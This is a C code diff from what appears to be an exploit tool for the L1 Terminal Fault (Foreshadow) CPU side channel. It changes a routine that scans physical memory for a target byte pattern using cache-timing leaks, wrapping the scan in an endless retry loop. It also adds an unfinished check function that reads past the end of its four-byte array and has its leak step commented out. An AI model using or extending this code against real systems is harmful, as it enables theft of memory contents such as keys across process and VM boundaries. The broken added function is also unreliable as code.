@@ -59,6 +59,18 @@ bool l1tf_check(void *leak_addr, full_reload_buffer_t reload_buffer,
   return time < THRESHOLD;
 }
 
+bool l1tf_check_4(void *leak_addr, full_reload_buffer_t reload_buffer,
+                  uint8_t check[4]) {
+  clflush(reload_buffer[check[4]]);
+  mfence();
+
+  printf("%x\n", *(uint32_t *)check);
+  // asm_l1tf_leak_full_with_mask(leak_addr, reload_buffer, 0xffffffff, -1, 24);
+
+  size_t time = access_time(reload_buffer[check[4]]);
+  return time < THRESHOLD;
+}
+
 leak_addr_t l1tf_leak_buffer_create() {
   void *leak_ptr = mmap(NULL, PAGE_SIZE, PROT_WRITE | PROT_READ,
                         MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
@@ -165,23 +177,27 @@ void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size,
   assert(needle_size > 0);
   assert(needle_size < scan_opts.stride);
 
-  for (uintptr_t ptr = scan_opts.start, i = 0; ptr < scan_opts.end;
-       ptr += scan_opts.stride, ++i) {
-    if (i % 100000 == 0) {
-      fprintf(stderr, "%.2f%%\r",
-              ((double)ptr / (double)scan_opts.end) * (double)100);
-    }
-    l1tf_leak_buffer_modify(&leak, (void *)ptr);
+  size_t attempt = 1;
+  while (true) {
+    for (uintptr_t ptr = scan_opts.start, i = 0; ptr < scan_opts.end;
+         ptr += scan_opts.stride, ++i) {
+      if (i % 100000 == 0) {
+        fprintf(stderr, "run %lx: %.2f%%\r", attempt,
+                ((double)ptr / (double)scan_opts.end) * (double)100);
+      }
+      l1tf_leak_buffer_modify(&leak, (void *)ptr);
 
-    bool found = true;
-    for (size_t idx = 0; idx < needle_size; ++idx) {
-      found &=
-          l1tf_check(((char *)leak.leak + idx), reload_buffer, needle[idx]);
-    }
+      bool found = true;
+      for (size_t idx = 0; idx < needle_size; ++idx) {
+        found &=
+            l1tf_check(((char *)leak.leak + idx), reload_buffer, needle[idx]);
+      }
 
-    if (found) {
-      return (void *)ptr;
+      if (found) {
+        return (void *)ptr;
+      }
     }
+    ++attempt;
   }
   return NULL;
 }
